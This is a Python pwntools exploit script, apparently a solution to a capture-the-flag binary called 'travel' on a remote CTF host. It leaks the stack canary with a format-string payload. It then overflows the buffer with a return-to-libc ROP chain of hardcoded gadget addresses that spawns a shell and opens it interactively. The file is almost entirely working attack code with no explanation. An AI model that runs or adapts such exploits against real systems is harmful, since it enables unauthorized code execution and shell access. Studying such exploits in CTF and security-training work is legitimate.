import pwn
import threading
from struct import pack

# base_libc = 0x7ffff7d96000
# remove debug output
pwn.context.log_level = 'WARNING'

# set library


LOCAL = "./travel"
REMOTE = ["01.linux.challenges.ctf.thefewchosen.com", 50106]

def thread(func):
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=func, args=args, kwargs=kwargs)
        thread.start()
        return thread
    return wrapper

class Exploit:
    def __init__(self, local=False, multipocess=False):
        if local:
            self.p = "pwn.process(LOCAL)"
        else:
            self.p = "pwn.remote(REMOTE[0], REMOTE[1])"
            
        self.canary_address = 33
        
        self.ret = 0x7ffff7dbfcd6
        self.pop_rdi_ret = 0x7ffff7dc03e5
        self.sh_libc = 0x7ffff7f6e698
        self.system_libc = 0x7ffff7de6d60
        # self.exit_libc = 0x7ffff7ddb5f0
        
        self.buffer_max = 215
    
    def get_canary(self, proc):
        'sending format string to leak the stack canary'
        payload = (f"%{self.canary_address}$p").encode()
        p = proc.recv(100)
        p = proc.sendline(payload)
        p = proc.recvline().decode()
        p = p[9:26]
        p = pack("<Q", int(p, 16))
        return p
    
    def retunr_to_libc(self, proc, canary):
        payload = b"\x90"*(self.buffer_max-15)+canary+b'\x90'*12+pack('<Q', 0x7ffff7dc03e5)+pack('<Q', 0x7ffff7f6e698)+pack('<Q', 0x7ffff7e9eb13)+pack('<Q', 0x0)+pack('<Q', 0x0)+pack('<Q', 0x0)+pack('<Q', 0x7ffff7dc1e51)+pack('<Q', 0x7ffff7f6e698)+pack('<Q', 0x7ffff7e810f0)
        p = proc.recv(100)
        p = proc.sendline(payload)
        p = proc.recv(100)
        proc.clean()
        proc.interactive()
        
    def start(self):
        with eval(self.p) as r:
            canary = self.get_canary(r)
            self.retunr_to_libc(r, canary)
            

Exploit(local=True).start()
